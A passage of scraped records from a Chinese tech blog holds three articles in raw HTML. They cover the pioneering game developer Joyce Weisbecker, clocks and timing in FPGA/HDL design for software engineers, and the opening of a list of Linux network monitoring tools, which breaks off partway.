与控制台的关系迅速结束。她说：“他们没有销售足够多的游戏，以至于从来没有回来向我要更多。”她从来没机会在零售店货架上看到她的第一个商业电子产品，但是她为自己做了一份拷贝。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmz31bozg2j20gh097n2r.jpg\" width=\"593\" height=\"331\"></p>\n<h2>RCA 之后的生活</h2>\n<p>1977 年，Joyce 在还与 RCA 签有合同的情况下，为 VIP 包含的登记项目（叫做RCA Cosmac VIP Game Manual）的商业供给编写了三个游戏 <i>Slide</i>, <i>Sum Fun</i>, 和 <i>Sequence Shoot</i>。之后，她的合同过期了。到决定是否继续追求游戏开发的时候，她决定专心于学校，选择了稳定，而不是向迅速发展的早期家庭个人电脑游戏市场前进的不确定性。</p>\n<p>Joyce 说：“你看了看周围，说，’好吧，我真的想在家生活，每天晚上复制录音带，然后去邮局，复印指导手册，在回家把他们放进塑料 Ziploc 袋子里然后邮寄给人们吗？’那就是那时的电脑游戏行业。”</p>\n<p>Joyce 在里德大学继续她的大学生涯，直到她在 1980 年取得了电脑工程和精算双学位。她从事了精算师工作，部分受到她父亲的偶像 Edmund Berkeley 的鼓舞。Edmund Berkeley 正是做了同样的工作。在 1998 年，她回到学校取得了电子工程的本科学位和计算机科学的研究生学位，并作为雷达信号处理工程师工作了一段时间，设计数字滤波器。最近几年，她又对游戏开发起了兴趣。她解释说：“我试着准备做真正有趣的 AI 和电脑辅助动画。因为我意识到我想做有故事基础的合作游戏。”</p>\n<p>至于她的父亲， Joseph 继续在 RCA 工作到 1982 年，那时肺气肿使得他开车去工作变得危险。他坚持认为肺的损伤来自于常年在家里地下室的狭小空间里焊接东西时吸入的树脂烟雾。Joyce 回忆说：“那是他的 Radio Shack 通量。”他在退休时仍然是一个爱好者，还是电子游戏的献身者，尤其是 <i>The Legend of Zelda</i>。他在 1990 年去世。</p>\n<p>回望过去，Joyce Weisbecker 不是特别想作为第一位女性电子游戏开发者出名。对她来说，那仅仅是个巧合。她把自己看为可能是第一位“非主流”电子游戏开发者，因为她是一个独立的合同工，而不是 RCA 的雇员。</p>\n<p>但是，她淡化了她作为一个科技英雄的角色。在我第一次询问她的过去时，她马上被我对她的成就的注意力所震惊。她说：“你是第一个问我的工作的人。我只准备好谈我父亲的工作，而我只是个脚注。”</p>\n<p>好吧，我在这要说 Joyce Weisbecker 绝不是个脚注。对科技历史上的每一个 Steve Jobs 和 Bill Gates 来说，有像她一样被忘记的先驱。通过纪念她在上世纪 70 年代的成就，当家庭电子游戏市场几乎被忘记时，我们可以帮助未来的工程师和科学家的更包容的未来铺平道路。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113401\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113401votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113401\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/chenyahui\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/chenyahui/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 17</a> · <a title=\"QQ：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "开发", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/14464260f3d26e25c16cf5131a6b2a95.jpg"], "title": "学数字设计的软件工程师该了解的时钟知识", "fav_nums": 0, "url": "http://blog.jobbole.com/113215/", "create_date": "2017/12/26", "url_object_id": "fda34f2acb731c915e85fe9c4c5dfeaa", "comment_nums": 2, "front_image_path": "full/3ad3595dc6e1f0ece9e8f816eeaeb9839f24a7ad.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q4000052677\">听风</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://zipcpu.com/blog/2017/09/18/clocks-for-sw-engineers.html\">zipcpu</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>如果你有软件工程师背景，想找一份数字设计工程师的工作，那么你需要做的第一件事就是尽可能早的学习时钟概念。对很多从软件工程师转来的初级硬件设计工程师来说，时钟概念都是一件恼人的事情。如果没有时钟，他们就可以将 HDL（Hardware Description Language，硬件描述语言）转换为一种编程语言，如 $display，if 和 for 循环，如同其他的任何编程语言一样。 然而，这些初级设计师所忽视的时钟，通常是数字设计中最基础的部分。</p>\n<p>没有什么时候会比在审查初级 HDL 设计工程师第一次设计的产品的时候，所发现的问题更多。现在，我已经和几位在我参与的论坛上发表过问题的人交谈过了。而当我深入了解后，发现他们正在做的是什么时，我为他们感到很尴尬。</p>\n<p>以我遇到的一个学生为例，他不理解为什么网络上没有人重视他的高级加密标准 (AES) 的HDL实现。此处，为了不让他因为名字或项目而尴尬，我暂且将他称之为学生。（不，我不是教授。）这个“学生”创建了一个 Verilog 设计，进行不止一轮的 AES 加密，但每一轮都是组合逻辑，且两者之间没有时钟。 我不记得他是在做 AES-128、AES-192 还是 AES-256，但 AES 需要进行 10 到 14 轮计算。 我记得，他的加密引擎在模拟器中运行完美，然而它只使用一个时钟来加密或解密他的数据。 他为自己的工作感到自豪，但不明白为什么那些看过这个项目的人都对他说，他的思考方式像一个软件工程师，而不是一个硬件设计师。</p>\n<p>事实上，我现在有机会给像这个“学生”一样的 HDL 新手软件工程师解释疑惑。 他们中的许多人对待 HDL 语言，就像对象另一种软件编程语言一样。 在编程之前，他们去寻找任何软件编程语言的基础知识：如何声明变量，如何创建一个 if 语句或 case 语句，如何编写循环等等。然后，他们编写代码就像编写一个计算机程序——一切都是顺序执行（图1），而完全忽略了数字设计中的基本事实，即所有运行都是并行的。</p>\n<p><img class=\"aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fmufh5ei8wj208p0h6dfr.jpg\"></p>\n<p style=\"text-align: center;\">图1：软件执行是顺序的</p>\n<p>有时这些程序员会使用模拟器，如 Verilator，iverilog 或者 EDA 平台。 然后，他们在逻辑代码中使用一堆$ display命令，将它们视为顺序的“printf”，并通过这些命令来使代码运行，而不是使用时钟。 他们的设计在模拟器中只是被单独地“执行”组合逻辑代码。</p>\n<p>这些学生向我描述他们的设计，并解释称他们的设计“不需要时钟就能执行”。</p>\n<p>天啊，这都是什么想法？</p>\n<p>实际上，任何数字逻辑设计如果使用没有时钟都是不能工作的。总有一些物理过程会创建输入。而 这些输入必须在某个开始时间都有效 ——这个时间在其设计中形成第一个时钟刻度。 同样地，在接收这些输入一段时间后就要输出。 对于给定的一组输入，所有输出的有效时间在“无时钟”设计中形成下一个“时钟”。 或许第一个时钟刻度是当他们调整好电路板上的最后一个开关的时候，而最后一个时钟刻度是当他们读取到结果的时候。时钟是如何形成的没关系：有一个时钟就可以。</p>\n<p>而这导致的结果就是，那些声称他们的设计“没有时钟”的人解释他正在以不切实际的方式使用模拟器，或者设计中存在一个外部时钟用于设置输入和读取输出 ——而这正是另外一种方式，表明设计中的确存在一个时钟。</p>\n<p>如果你发现你自己正试图以这种方式理解数字逻辑必须有一个时钟才能执行，或你认识的某人也是这么尝试理解的，那么本文正适合你们。</p>\n<p>接下来，让我们花一两分钟来讨论时钟，以及为什么围绕时钟来构建和设计你的数字逻辑很重要。</p>\n<h2>第一部分：硬件设计是并行的</h2>\n<p>硬件设计学习中的第一部分也是最难的部分，就是硬件设计是并行设计。所有的代码指令并不是依次执行，如同一条指令连着下一条指令（如图1所示），就像计算机程序一样。相反，所有的指令在同一时刻执行，如图2所示。</p>\n<p><img class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fmufh4yz9wj20hb02y0sl.jpg\"></p>\n<p style=\"text-align: center;\">图2：硬件逻辑并行运行</p>\n<p>正是这一点，让很多东西变得不一样。</p>\n<p>首先需要改变的是开发人员。你需要学习以并行的方式思考。</p>\n<p>如果要通过举例说明两者的区别，硬件循环也许会是个不错的例子。</p>\n<p>软件设计中，一个循环是由一连串的指令构成，如图3所示。这些指令构造了一组初始化条件，而真正的逻辑在循环内部执行。通过使用一个循环变量来构造和定义一个循环逻辑，并且这个变量在每次循环中通常都是增加的。计算机CPU不停地重复执行循环中的指令和逻辑，直到循环变量达到了终止条件。循环运行的次数越多，它在程序中运行的时间也就越长。</p>\n<p><img class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fmufh4j5drj20c40jvt8y.jpg\"></p>\n<p style=\"text-align: center;\">图3：软件循环</p>\n<p>而基于硬件的硬件描述语言循环与软件循环完全不同。恰恰相反，HDL 合成工具使用循环来使得所有逻辑的副本同时并行运行。而用来构造循环逻辑的代码，如定义索引、索引增长、检查索引是否达到终止条件等等，是不需要合成的，通常会被移除。此外，由于合成工具正在构建物理线路和逻辑块，所以执行循环的次数在合成时间之后不能改变。之后，硬件的数量是固定的，不能再改变。</p>\n<p>导致的结果便是，硬件循环结构（如下图4所示），与软件循环结构（如上图3所示）有很大的区别。</p>\n<p><img class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fmufh47lvsj20d802awec.jpg\"></p>\n<p style=\"text-align: center;\">图4：HDL循环</p>\n<p>这有几个后果。例如，硬件循环迭代与软件循环迭代不同，它不必依赖前期的循环迭代的输出。这导致的结果是，运行一个包含一组数据的逻辑循环很难在下一个时钟得到响应。</p>\n<p>但是…现在让我们再次回到时钟概念。</p>\n<p>时钟是任何 FPGA 设计的核心。一切都围绕着它展开。事实上，我认为所有的逻辑设计开发都应该从时钟开始。时钟不应该在设计完成后添加， 而是在你一开始思考如何设计架构时就要考虑。</p>\n<h2>为什么时钟很重要？</h2>\n<p>第一步，你要理解数字逻辑设计的一切操作在硬件上执行时都是需要时间的。不仅如此，不同的操作需要的时间总量也是不同的。从芯片上的一部分移动到另一部分也要花费时间。</p>\n<p>或许用图表的方式能更直观的解释这一点。我们将输入置于算法的顶部，逻辑放在中间，而输出则放在底部。时间为轴，从上到下运行，从一个时钟到下一个时钟。这种视觉效果看起来就如下图 5 所示：</p>\n<p><img class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fmufh3undmj20ko0ekmy8.jpg\"></p>\n<p style=\"text-align: center;\">图5：三个操作的逻辑耗时</p>\n<p>图例 5 展示了几个不同的操作：加法、乘法、以及多轮的 AES 算法——尽管为了讨论的目的，它可以是多轮任意其它算法。我在垂直方向上使用了方框的尺寸，以表示每个操作可能需要多少时间。此外，将依赖于其它操作的方框堆叠起来。因此，如果你想要在一个时钟里面做很多轮的 AES 算法，你要明白第二轮算法在第一轮算法结束后才会开始。因此，适应这一逻辑将会增加时钟之间的时间间隔，并减慢整体的时钟频率。</p>\n<p>现在让我们关注这个粉色方框。</p>\n<p>这个粉色框表示在硬件电路中浪费的运行能力，即你本可以用来做更多事情的时间，但因为需要等待时钟，或者等待输入被处理，而导致你什么也不能做。例如，在上面的概念图中，完成乘法运算所花费的时间不需要长达一轮 AES 算法的时间，加法也是。然而，当 AES 算法正在执行时，你不能够对这两个操作结果进行任何的动作，因为这些操作都需要等待下一个时钟来获取他们的下一个输入。这就是图 5 中粉色方框所表达的：空闲电路。另外，由于每一轮 AES 算法都会推迟下一个时钟的到来，所以图 5 中存在大量的空闲电路。因此，该设计的运行速度不会像硬件允许的那么快。</p>\n<p>如果我们只使用 AES 算法，那么每一个时钟都正好完成一轮的 AES 计算。如此一来，就可以减少运行能力的浪费，从而让整个设计运行得更快。</p>\n<p>图 6 展示了这种设计思想。</p>\n<p><img class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fmufh3duaqj20kj08ewf8.jpg\"></p>\n<p style=\"text-align: center;\">图6：分解操作加快时钟频率</p>\n<p>由于我们将操作分解为更小的操作，每一个都能在时钟单元内完成，因此，我们提高了运行能力。甚至，我们可以通过管道加密算法，而不是一次只加密一个数据块。这种逻辑设计的结果不会比上图 5 所示的更快，但是如果可以保持管道充满，则可以提高 AES 加密吞吐量至 10-14x 之间。</p>\n<p>所以，这个设计更赞。</p>\n<p>还可以有其它更好的方案吗？当然！如果你熟悉 AES ，你就知道 AES 算法的每一轮计算中都有一些独立的步骤。这些步骤可再次分解，从而可以再次提高每轮逻辑算法的整体时钟速度。而这可以增加你能执行的加法和乘法运算的次数，以及加密引擎的微管道，以便你能在每个时钟的基础上运行更多的数据。</p>\n<p>设计不错。</p>\n<p>不过，上图 6 中还有些其它的东西。</p>\n<p>首先，箭头表示路由延迟。（这个数字不是按比例绘制的，它仅仅是这个讨论例子的示例。）每一块逻辑都需要上一块逻辑将结果传递给它。这意味着即使某个逻辑块不需要时间执行——例如，只是重新排列线路或其它等等，将逻辑块从一个芯片的末端移动到另一块也是需要花费时间的。所以，即使你将操作极简化了，每一轮数据的传递仍旧存在延迟。</p>\n<p>其次，你可能注意到，没有一个箭头的起始处在时钟刻度上，即没有一个逻辑块一直运行到下个时钟开始。这是为了演示 启动时间和维持时间的概念。触发器电路，即一种捕获数据并同步到时钟的电路结构，在下一个时钟到达前需要一定的时间，此刻数据也已经是固定和确定的。另外，尽管时钟通常被认为是瞬时的，但它从来都不是。它在不同的时刻到达芯片的不同部位。而这再次要求操作之间需要一些缓冲。</p>\n<p>通过以上讨论，我们可以得出哪些结论呢？</p>\n<ol>\n<li>逻辑实现需要花费时间。</li>\n<li>逻辑越多花费的时间也越多。</li>\n<li>完成两个时钟刻度之间的逻辑所花费的时间总和（包含例行的延迟、启动和维持时间、时钟不确定性等），限制了时钟速度。时钟之间的逻辑处理越多，时钟速率就越慢。</li>\n<li>完成最慢操作所需的时钟速度，限制了最快操作的速度。正如上述例子中的加法操作。它的执行速度本可以比乘法以及任何一轮单独的 AES 算法都更快，但它的速度在该设计中被其余的逻辑拖慢了。</li>\n<li>硬件定义也会限制时钟速度。即使操作中不包含任何的逻辑，也是需要花费时间的。</li>\n</ol>\n<p>因此，平衡的设计尝试在整个设计中将大量相同的逻辑放在时钟之间。</p>\n<h2>时钟之间应该放多少逻辑量？</h2>\n<p>现在你已经知道你必须处理时钟，那么根据上述信息你该怎么修改和构思你的设计？答案是限制时钟之间的逻辑数量。但问题是，这个数量是多少呢？你又该如何得到这个数量呢？</p>\n<p>得出时钟之间你能放置多少逻辑数量的一个方法便是，将时钟速度设置为任意速度，然后在与你需要的硬件配套的工具套件中构建你的设计。无论何时，当你的设计无法满足其计时需求时，都需要返回并拆分设计中的组件，或减慢时钟速度。通过使用设计工具，你最终能够找到那条最长的路径。</p>\n<p>如果你这样做了，你将自学到一些探索方法，然后通过使用这些方法，就可以找到在运行的硬件的时钟之间可以放置的具体逻辑数量。</p>\n<p>例如，我倾向于在 Xilinx 7 系列零件中进行 100MHz 时钟速率的设计。这些设计通常运行在大约 80MHz 速率的Spartan-6 上，或者50MHz的 iCE40上——尽管这些都不是硬性关系。把在一个芯片上正常执行的程序放在另一个上执行，可能会超载，亦可能会时钟检查失败。</p>\n<p>下面有一些我曾经在使用时钟时得到的一些粗略的探索性经验。由于只是个人经验，这些方法并不适合所有的设计：</p>\n<p>1.通常，我在设计一个32 位的加法时，会使用一个时钟内有 4-8个条目的多路复用器。</p>\n<p style=\"padding-left: 30px;\">如果要使用一个较快的时钟，例如频率为 200 MHz，可能就需要将加法操作从多路复用器上剥离下来。</p>\n<p style=\"padding-left: 30px;\">ZipCPU 的最长路径，实际上是从 ALU 的输出到 ALU 的输入。</p>\n<p style=\"padding-left: 30px;\">这听起来很简单。它甚至符合前面的经验法则。</p>\n<p style=\"padding-left: 30px;\">但 ZipCPU 的问题在于，如何在较快的速度下将输出路由回输入。</p>\n<p style=\"padding-left: 30px;\">让我们跟踪一下这个路径：跟随 ALU，逻辑路径首先通过一个4路多路复用器来决定是否ALU，内存或分频输出需要回写。 然后将该回写结果馈送到旁路电路中，以确定是否需要将其立即传入 ALU 作为其两个输入之一。 只有在该多路复用器末端并且旁路路径执行 ALU 操作时，多路复用器才会产生。 因此，所有这些逻辑步骤都会在通过 ALU 时造成压力。 然而，由于ZipCPU的设计结构，任何在此路线的时钟都可能会按比例减缓 ZipCPU 运行速度。 这意味着有可能这条最长线路仍然是 ZipCPU 中最长的一段线路。</p>\n<p style=\"padding-left: 30px;\">我曾经对以更高的速度运行 ZipCPU 感兴趣，这是我尝试分解和优化的第一个逻辑路径。</p>\n<p>2.16×16位乘法器需要一个时钟。</p>\n<p style=\"padding-left: 30px;\">有时，在某些硬件上，我可以在一个时钟上运行 32×32 位的乘法。而在其他硬件上，我需要分解这个操作。 因此，如果我需要一个签名的 32×32 位乘法，我使用我专门为此建立的流水线例程。 该例程包含其中的几种乘法方法，允许我从适合我目前正在工作的硬件的选项中进行选择。</p>\n<p style=\"padding-left: 30px;\">你的硬件可能也还支持 18×18 位乘法。 一些 FPGA 还支持在一个优化的硬件时钟内进行乘法和累加。只要你对使用的硬件足够熟悉，你就知道你能用它做什么。</p>\n<p>3. 访问任何 RAM 块都需要一个时钟。 如果可以的话，应尽量避免在该时钟周期调整索引。 同样，避免在此时钟期间做任何有关输出的事情。</p>\n<p style=\"padding-left: 30px;\">尽管我认为这是一条很好的规则，但我已经在 100MHz 的 Xilinx 7 系列设备上违反了其中的两个部分，而没有产生（严重的）影响。 （在 iCE40 设备上有问题。）</p>\n<p style=\"padding-left: 30px;\">例如，ZipCPU 从寄存器读取数据，给结果加上一个即时数，然后从结果中选择是否应该在寄存器、PC上，还是条件代码寄存器中加上即时数——都在一个时钟内。</p>\n<p style=\"padding-left: 30px;\">另外一个例子就是，长期以来 Wishbone Scope 根据当前时钟是否从存储器进行读取，确定从缓冲区内读取的地址。 从这个依赖中断它，需要添加另一个延迟时钟，所以当前版本不会再破坏这个（自我强加的）规则。</p>\n<p>这些规则只是我随着时间积累下来的方法经验，用来判定单个时钟内可容纳的逻辑数量。 这些经验法则与设备和时钟速度有关，因此它们可能不适用于你的设计开发。 我建议你积累自己的探索经验，以便你知道在时钟周期之间能做些什么。</p>\n<h2>下一步</h2>\n<p>也许我能够提供给任何新的 FPGA 开发人员的最后建议，就是学习 HDL 时要在实际硬件上进行练习，而不仅仅是在模拟器上。与实际硬件组件相关联的工具，其在检查代码和计算所需时间方面都很出色。 此外，以高速时钟构建设计的想法是好的，但这不是硬件设计的最终结果。</p>\n<p>记住，硬件设计是并行的。 一切都从时钟开始。</p>\n<p>最后，如果本文有助于你更好地了解HDL，或者它让你更加困惑了，请随时联系告诉我。 这会让我知道，我将来是否有必要再次回来讨论这个话题。 谢谢！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113215\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113215votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113215\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">听风</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/9538B04AD8C6883F49C38BC8ECDDAF3C/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q4000052677\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q4000052677/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 24</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/0031ff9dcefbd194a2dbc1051d270807.png"], "title": "十个不错的 Linux 网络监视工具", "fav_nums": 4, "url": "http://blog.jobbole.com/113367/", "create_date": "2017/12/22", "url_object_id": "dcf461a9dec974620d1cae3390ca0ade", "comment_nums": 5, "front_image_path": "full/f45742993aebb40dc85b097aeb88d163712b18e7.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.linuxandubuntu.com/home/best-network-monitoring-tools-for-linux\">Linuxandubuntu</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9153-1.html\">LCTT</a>   </div><p>保持对我们的网络的管理，防止任何程序过度使用网络、导致整个系统操作变慢，对管理员来说是至关重要的。有几个网络监视工具可以用于不同的操作系统。在这篇文章中，我们将讨论从 Linux 终端中运行的 10 个网络监视工具。它对不使用 GUI 而希望通过 SSH 来保持对网络管理的用户来说是非常理想的。</p>\n<h1 id=\"toc_1\">iftop</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/0031ff9dcefbd194a2dbc1051d270807.png\"><img class=\"aligncenter size-full wp-image-113368\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/0031ff9dcefbd194a2dbc1051d270807.png\" alt=\"180512yyfcb2bvfbbbbpmh\"></a></p>\n<p style=\"text-align: center\"><em>iftop network monitoring tool</em></p>\n<p>Linux 用户通常都熟悉 <code>top</code> —— 这是一个系统监视工具，它允许我们知道在我们的系统中实时运行的进程，并可以很容易地管理它们。<code>iftop</code> 与 <code>top</code> 应用程序类似，但它是专门监视网络的，通过它可以知道更多的关于网络的详细情况和使用网络的所有进程。</p>\n<p>我们可以从 <a href=\"http://www.ex-parrot.com/pdw/iftop/\">这个链接</a> 获取关于这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_2\">vnstat</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/c7c242518c7677eec7e5c7b44d70d9ca.png\"><img class=\"aligncenter size-full wp-image-113369\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/c7c242518c7677eec7e5c7b44d70d9ca.png\" alt=\"180512yyfcb2bvfbbbbpmh\"></a></p>\n<p style=\"text-align: center\"><em>vnstat network monitoring tool</em></p>\n<p><code>vnstat</code> 是一个缺省包含在大多数 Linux 发行版中的网络监视工具。它允许我们对一个用户选择的时间周期内发送和接收的流量进行实时控制。</p>\n<p>我们可以从 <a href=\"http://humdi.net/vnstat/\">这个链接</a> 获取关于这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_3\">iptraf</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/cd2e2df478b8ada815a3182f13f8471f.gif\"><img class=\"aligncenter size-full wp-image-113370\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/cd2e2df478b8ada815a3182f13f8471f.gif\" alt=\"180514hf11ozfuf1dvpgmk\"></a></p>\n<p class=\"article_img_desc\" style=\"text-align: center\"><em>iptraf monitoring tool for linux</em></p>\n<p>IPTraf 是一个基于控制台的 Linux 实时网络监视程序。它会收集经过这个网络的各种各样的信息作为一个 IP 流量监视器，包括 TCP 标志信息、ICMP 详细情况、TCP / UDP 流量故障、TCP 连接包和字节计数。它也收集接口上全部的 TCP、UDP、…… IP 协议和非 IP 协议 ICMP 的校验和错误、接口活动等等的详细情况。（LCTT 译注：此处原文有误，径改之）</p>\n<p>我们可以从 <a href=\"http://iptraf.seul.org/\">这个链接</a> 获取这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_4\">Monitorix – 系统和网络监视</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/ee5444cf29a457d16b868d948ea12e2b.png\"><img class=\"aligncenter size-full wp-image-113371\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/ee5444cf29a457d16b868d948ea12e2b.png\" alt=\"180512yyfcb2bvfbbbbpmh\"></a></p>\n<p style=\"text-align: center\"><em>monitorix system monitoring tool for linux</em></p>\n<p>Monitorix 是一个轻量级的免费应用程序，它设计用于去监视尽可能多的 Linux / Unix 服务器的系统和网络资源。它里面添加了一个 HTTP web 服务器，可以定期去收集系统和网络信息，并且在一个图表中显示它们。它跟踪平均系统负载、内存分配、磁盘健康状态、系统服务、网络端口、邮件统计信息（Sendmail、Postfix、Dovecot 等等）、MySQL 统计信息以及其它的更多内容。它设计用于去管理系统的整体性能，以及帮助检测故障、瓶颈、异常活动等等。</p>\n<p>下载及更多 <a href=\"http://www.monitorix.org\">信息在这里</a>。</p>\n<h1 id=\"toc_5\">dstat</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/bb645c76ca4667edb3fd2b18e8fade5c.png\"><img class=\"aligncenter size-full wp-image-113372\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/bb645c76ca4667edb3fd2b18e8fade5c.png\" alt=\"180512yyfcb2bvfbbbbpmh\"></a></p>\n<p style=\"text-align: center\"><em>dstat network monitoring tool</em></p>\n<p>这个监视器相比前面的几个知名度低一些，但是，在一些发行版中已经缺省包含了。</p>\n<p>我们可以从 <a href=\"http://dag.wiee.rs/home-made/dstat/\">这个链接</a> 获取这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_6\">bwm-ng</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/c06fbf012db3866acdb9cfcf64ae35a7.png\"><img class=\"aligncenter size-full wp-image-113373\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/c06fbf012db3866acdb9cfcf64ae35a7.png\" alt=\"180512yyfcb2bvfbbbbpmh\"></a></p>\n<p style=\"text-align: center\"><em>bwm-ng monitoring tool</em></p>\n<p>这是最简化的工具之一。它允许你去从连接中交互式取得数据，并且，为了便于其它设备使用，在取得数据的同时，能以某些格式导出它们。</p>\n<p>我们可以从 <a href=\"http://sourceforge.net/projects/bwmng/\">这个链接</a> 获取这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_7\">ibmonitor</h1>\n<p><a 